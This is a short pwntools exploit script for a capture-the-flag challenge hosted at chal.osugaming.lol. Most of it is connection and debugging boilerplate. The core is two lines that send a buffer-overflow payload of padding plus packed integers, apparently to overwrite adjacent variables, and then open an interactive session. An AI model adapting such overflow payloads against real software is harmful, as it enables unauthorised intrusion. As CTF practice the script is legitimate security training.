#!/usr/bin/env python3

from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

exe = ELF("challenge_patched")
context.binary = exe

host = "chal.osugaming.lol"
port = 7279

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# shortcut lambda
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
# --- end ---

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
start
c
'''.format(**locals())

io = start()

# --- good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :) ---

# functions

# --- end functions ---

sla(b"How much pp did you get? ", p64(0))
sla(b"Any last words?\n", b"a"*16 + p64(20) + p32(0) + p32(727))

io.interactive()

